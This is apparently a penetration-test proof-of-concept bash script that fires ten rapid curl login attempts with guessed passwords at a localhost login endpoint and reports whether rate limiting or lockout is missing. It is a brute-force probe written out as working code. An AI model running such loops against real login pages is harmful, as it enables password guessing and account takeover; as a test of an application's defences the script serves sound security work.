#!/bin/bash

# POC: No Rate Limiting on Login Endpoint - Brute Force Attack Possible
# This script demonstrates that the login endpoint accepts unlimited login attempts
# without any rate limiting, account lockout, or throttling mechanisms.

TARGET_URL="http://localhost:5003/login"
TEST_USERNAME="testuser"
ATTEMPT_COUNT=10

echo "=========================================="
echo "Rate Limiting POC - Login Endpoint"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Username: $TEST_USERNAME"
echo "Attempts: $ATTEMPT_COUNT"
echo ""
echo "Attempting $ATTEMPT_COUNT rapid sequential login attempts..."
echo ""

# Track response times and HTTP status codes
declare -a response_codes
declare -a response_times

success_count=0
immediate_responses=0

for i in $(seq 1 $ATTEMPT_COUNT); do
    start_time=$(date +%s%N)
    
    # Perform login attempt with different passwords
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
        -d "username=$TEST_USERNAME&password=attempt$i" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    end_time=$(date +%s%N)
    response_time_ms=$(( (end_time - start_time) / 1000000 ))
    
    response_codes[$i]=$response
    response_times[$i]=$response_time_ms
    
    # Check for rate limiting responses
    if [ "$response" = "200" ] || [ "$response" = "302" ]; then
        success_count=$((success_count + 1))
    fi
    
    # Check if response was immediate (less than 500ms)
    if [ $response_time_ms -lt 500 ]; then
        immediate_responses=$((immediate_responses + 1))
    fi
    
    echo "Attempt $i: HTTP $response (${response_time_ms}ms)"
done

echo ""
echo "=========================================="
echo "Results:"
echo "=========================================="
echo "Total Attempts: $ATTEMPT_COUNT"
echo "Successful Responses (200/302): $success_count"
echo "Immediate Responses (< 500ms): $immediate_responses"
echo ""

# Check if all attempts succeeded without rate limiting
if [ $success_count -eq $ATTEMPT_COUNT ]; then
    echo "✓ VULNERABILITY CONFIRMED:"
    echo "  - All $ATTEMPT_COUNT login attempts were accepted"
    echo "  - No rate limiting (HTTP 429) responses received"
    echo "  - No account lockout (HTTP 403) responses received"
    echo "  - No throttling or delays imposed"
    echo "  - Brute force attack is possible!"
    exit 0
else
    echo "✗ Rate limiting may be present:"
    echo "  - Some requests were blocked or throttled"
    exit 1
fi